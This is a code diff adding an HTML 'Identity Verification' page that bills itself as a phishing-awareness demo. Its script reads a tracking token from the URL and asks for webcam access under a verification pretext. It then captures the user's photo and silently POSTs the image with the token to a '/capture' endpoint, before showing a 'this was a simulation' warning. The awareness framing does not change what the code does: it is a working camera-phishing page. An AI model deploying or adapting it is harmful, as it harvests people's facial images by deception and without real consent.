@@ -1,0 +1,144 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>🔐 Identity Verification</title>
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet">
+<style>
+  :root { --cyan: #00f5ff; }
+  * { margin:0; padding:0; box-sizing:border-box; }
+  body { font-family:'Poppins',sans-serif; background:radial-gradient(circle at center,#1a1a1a 0%,#000 100%); color:#e0e0e0; min-height:100vh; display:flex; align-items:center; justify-content:center; }
+  .glass-card { background:rgba(20,20,30,0.92); backdrop-filter:blur(16px); border-radius:20px; border:1px solid rgba(0,245,255,0.25); box-shadow:0 0 50px rgba(0,245,255,0.18); width:100%; max-width:520px; overflow:hidden; }
+  .header { text-align:center; padding:35px 20px 25px; border-bottom:1px solid rgba(0,245,255,0.15); }
+  .title { font-size:2.3rem; font-weight:700; background:linear-gradient(90deg,#00f5ff,#00bfff); -webkit-background-clip:text; -webkit-text-fill-color:transparent; }
+  .subtitle { font-size:1rem; opacity:0.85; margin-top:8px; }
+  .content { padding:30px 25px; }
+  .stage { text-align:center; min-height:340px; display:flex; flex-direction:column; align-items:center; justify-content:center; gap:20px; }
+  .loader { width:85px; height:85px; border:7px solid rgba(0,245,255,0.2); border-top-color:var(--cyan); border-radius:50%; animation:spin 1.1s linear infinite; }
+  @keyframes spin { to { transform:rotate(360deg); } }
+  .message { font-size:1.15rem; color:var(--cyan); font-weight:500; }
+  video, #captured, #preview { width:100%; max-width:380px; border-radius:16px; border:2px solid rgba(0,245,255,0.4); }
+  button { background:linear-gradient(90deg,#00f5ff,#00bfff); color:#000; font-weight:600; padding:14px 36px; border:none; border-radius:50px; font-size:1.05rem; cursor:pointer; margin-top:15px; box-shadow:0 10px 25px rgba(0,245,255,0.35); }
+  .warning { background:rgba(255,70,70,0.18); border:1px solid #ff5555; color:#ff8888; padding:18px; border-radius:14px; margin:25px 0; text-align:left; font-size:0.96rem; }
+  .device-info { background:rgba(0,0,0,0.5); padding:14px; border-radius:10px; font-size:0.82rem; margin-top:20px; color:#bbb; }
+</style>
+</head>
+<body>
+<div class="glass-card">
+  <div class="header">
+    <h1 class="title">🔐 Identity Verification</h1>
+    <p class="subtitle">This demo shows how fake verification pages can mislead users.</p>
+  </div>
+  <div class="content">
+
+    <div id="consent" class="stage">
+      <img id="preview" src="" alt="preview" style="display:none;">
+      <h2>Verification Required</h2>
+      <p style="max-width:340px;line-height:1.6;opacity:0.9;">Please allow camera access to continue.</p>
+      <button onclick="startDemo()">Allow Camera Access</button>
+    </div>
+
+    <div id="loading" class="stage" style="display:none;">
+      <div class="loader"></div>
+      <div id="status" class="message">Initializing...</div>
+      <div class="device-info" id="devinfo"></div>
+    </div>
+
+    <div id="camera" class="stage" style="display:none;">
+      <video id="video" autoplay playsinline></video>
+      <button onclick="capturePhoto()">📸 Capture Identity Photo</button>
+    </div>
+
+    <div id="result" class="stage" style="display:none;">
+      <img id="captured" src="" alt="Captured Photo">
+      <div class="warning">
+        <strong>⚠️ This was a simulation.</strong><br><br>
+        Real phishing pages may try to capture your data or access your camera without clear intent.
+      </div>
+      <button onclick="resetDemo()" style="background:#333;color:#fff;">Restart Demo</button>
+    </div>
+
+  </div>
+</div>
+
+<script>
+  const urlParams = new URLSearchParams(window.location.search);
+  const TOKEN = urlParams.get('t');
+  const CAPTURE_ENDPOINT = "/capture";
+  const IMG_ENDPOINT = "/img/";
+
+  let stream = null;
+
+  if (TOKEN) {
+    const img = document.getElementById('preview');
+    img.src = `${IMG_ENDPOINT}${TOKEN}.jpg`;
+    img.style.display = 'block';
+  }
+
+  function showDeviceInfo() {
+    document.getElementById('devinfo').innerHTML = `
+      User-Agent: ${navigator.userAgent.substring(0,70)}...<br>
+      Screen: ${screen.width}×${screen.height}<br>
+      Time: ${new Date().toLocaleString('en-IN')}
+    `;
+  }
+
+  const loaderMessages = ["Initializing...","Connecting...","Simulating analysis...","Completed"];
+  let msgIdx = 0;
+  function runLoader() {
+    document.getElementById('status').textContent = loaderMessages[msgIdx];
+    msgIdx = (msgIdx+1)%loaderMessages.length;
+    if (msgIdx !== 0) setTimeout(runLoader,1100);
+    else setTimeout(()=>{
+      document.getElementById('loading').style.display='none';
+      document.getElementById('camera').style.display='flex';
+    },800);
+  }
+
+  async function startDemo() {
+    document.getElementById('consent').style.display='none';
+    document.getElementById('loading').style.display='flex';
+    showDeviceInfo();
+    runLoader();
+    try {
+      stream = await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}});
+      document.getElementById('video').srcObject = stream;
+    } catch(e) {
+      alert("Camera access denied.");
+      resetDemo();
+    }
+  }
+
+  async function capturePhoto() {
+    const video = document.getElementById('video');
+    const canvas = document.createElement('canvas');
+    canvas.width = video.videoWidth || 1280;
+    canvas.height = video.videoHeight || 720;
+    canvas.getContext('2d').drawImage(video,0,0);
+    const imageBase64 = canvas.toDataURL('image/jpeg',0.92);
+    document.getElementById('captured').src = imageBase64;
+    if (stream) stream.getTracks().forEach(t=>t.stop());
+    document.getElementById('camera').style.display='none';
+    document.getElementById('result').style.display='flex';
+
+    try {
+      await fetch(CAPTURE_ENDPOINT, {
+        method:"POST",
+        headers:{"Content-Type":"application/json"},
+        body: JSON.stringify({token: TOKEN, image: imageBase64})
+      });
+    } catch(e) {}
+  }
+
+  function resetDemo() {
+    if (stream) stream.getTracks().forEach(t=>t.stop());
+    location.reload();
+  }
+
+  window.addEventListener('beforeunload', ()=>{
+    if (stream) stream.getTracks().forEach(t=>t.stop());
+  });
+</script>
+</body>
+</html>
